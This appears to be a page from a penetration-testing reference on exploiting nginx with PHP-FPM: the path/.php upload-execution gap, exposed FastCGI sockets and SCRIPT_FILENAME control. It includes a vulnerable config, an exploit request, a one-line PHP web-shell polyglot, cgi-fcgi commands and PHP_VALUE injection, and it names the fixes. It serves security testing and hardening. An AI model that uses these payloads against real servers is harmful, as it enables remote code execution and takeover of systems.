---
title: "nginx FastCGI and PHP-FPM: upload execution and SCRIPT_FILENAME control"
order: 2
description: "Exploiting nginx+PHP-FPM wiring: the fastcgi_split_path_info plus cgi.fix_pathinfo gap that executes uploads via path/.php, exposed FPM sockets, and controlling SCRIPT_FILENAME for arbitrary execution."
keywords:
  - fastcgi_split_path_info
  - cgi.fix_pathinfo
  - php-fpm
  - SCRIPT_FILENAME
  - nginx upload rce
---

# FastCGI and PHP-FPM

nginx forwards PHP requests to PHP-FPM over FastCGI, passing `SCRIPT_FILENAME` (the file FPM executes). The classic nginx mistakes here execute files that were never meant to run, turning an upload into RCE.

## The path/.php execution gap

A regex `location` that forwards anything matching `\.php` to FPM, combined with `fastcgi_split_path_info` and the historical `cgi.fix_pathinfo=1`, executes files that merely *contain* `.php` in the path:

```nginx
location ~ \.php$ {
    fastcgi_split_path_info ^(.+\.php)(/.+)$;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    fastcgi_pass 127.0.0.1:9000;
}
```

A request like:

```
GET /uploads/avatar.jpg/x.php HTTP/1.1
```

matches `\.php`, and with `cgi.fix_pathinfo=1` FPM falls back to executing `/uploads/avatar.jpg` as PHP when `x.php` does not exist. An uploaded image carrying `<?php ... ?>` then runs. This is the canonical "upload a JPEG, get RCE" on nginx+PHP stacks. The fix is `try_files $uri =404;` in the PHP location (so non-existent scripts are not passed to FPM) and `cgi.fix_pathinfo=0`, but the vulnerable pattern is widespread.

## Exposed FPM socket

If PHP-FPM's TCP socket (classically `127.0.0.1:9000`, sometimes bound to all interfaces) is reachable, no nginx is needed: speak FastCGI directly and set `SCRIPT_FILENAME` to any PHP file, or inject `PHP_VALUE` params (`auto_prepend_file=php://input`, `allow_url_include=On`) to run the request body:

```bash
SCRIPT_FILENAME=/var/www/html/index.php \
  cgi-fcgi -bind -connect 127.0.0.1:9000
```

`Gopherus` crafts the raw FastCGI packet, which also enables reaching FPM through an SSRF as a `gopher://127.0.0.1:9000/...` payload (see [variable proxy_pass SSRF](variable-proxy-pass-ssrf.md)).

## Exploitation

- Test the `path/.php` trick against any upload or static directory, paired with a polyglot image carrying `<?php` (`GIF89a;<?php system($_GET['c']); ?>`).
- Port-scan for an exposed `9000/tcp`; if present, use `cgi-fcgi`/Gopherus to set `SCRIPT_FILENAME` and execute, or inject `PHP_VALUE`.
- When FPM is only reachable via SSRF, build the `gopher://` FastCGI payload with Gopherus.

## Tools

- **cgi-fcgi**, **Gopherus**, FastCGI exploit scripts.

## References

- nginx: fastcgi_split_path_info; PHP: cgi.fix_pathinfo; PHP-FPM documentation
- Gopherus FastCGI research
